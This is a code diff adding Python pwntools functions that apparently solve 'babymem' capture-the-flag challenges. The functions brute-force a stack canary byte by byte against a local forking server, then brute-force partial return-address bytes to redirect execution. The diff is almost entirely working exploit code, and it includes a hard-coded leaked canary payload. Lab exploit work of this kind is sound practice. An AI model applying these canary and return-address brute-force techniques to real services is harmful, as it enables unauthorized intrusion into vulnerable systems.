@@ -80,3 +80,50 @@ def leak_canary(pre_len, byte1, byte2, challenge, to_canary = -1):
 # leak_canary(41, b'\x74', b'\x29', 'babymem_level12.1')
 # leak_canary(104 + 1, b'\xf9', b'\xd5', 'babymem_level14.0', to_canary = 376)
 # leak_canary(8 + 1, b'\x10', b'\xc5', 'babymem_level14.1', to_canary = 280)
+
+def test_canary(payload, end=None):
+    r = remote('localhost', 1337)
+    r.sendline(str(len(payload)).encode())
+    r.sendline(payload)
+    while True:
+        line = r.recvline(timeout=0.2)
+        if(end != None and end in line):
+            break
+        if(b'pwn' in line):
+            r.close()
+            return line
+        if(b'stack smashing detected' in line):
+            r.close()
+            return b'stack smashing detected'
+        if(not line):
+            break
+        print(line.decode('utf-8'), end='')
+    r.close()
+    return b''
+
+def brute_force_canary(canary_offset):
+    pre = b'a' * canary_offset + b'\x00'
+    for pos in range(1, 8):
+        for cur in range(0, 256):
+            cur_byte = bytes([cur])
+            res = test_canary(pre + cur_byte)
+            if(res != b'stack smashing detected'):
+                pre = pre + cur_byte
+                break
+    return pre
+
+def brute_force_addr(payload_with_canary, byte1, byte2_set):
+    for byte2 in byte2_set:
+        print(f'try byte1 {byte1}, byte2 {byte2}')
+        res = test_canary(payload_with_canary + byte1 + byte2)
+        # print(res)
+        if(b'pwn' in res):
+            print(res.decode('utf-8'))
+            return
+
+# we can get this by running brute_force_canary(104)
+# payload_with_canary = brute_force_canary(104)
+payload_with_canary = b'a'*104 + b'\x00\na\xda\x02\x9d\xd4\x00'
+
+# '0x?f4e'
+brute_force_addr(payload_with_canary + b'a'*8, byte1 = b'\x4e', byte2_set = [bytes([x | 0xf]) for x in range(0, 256, 16)])
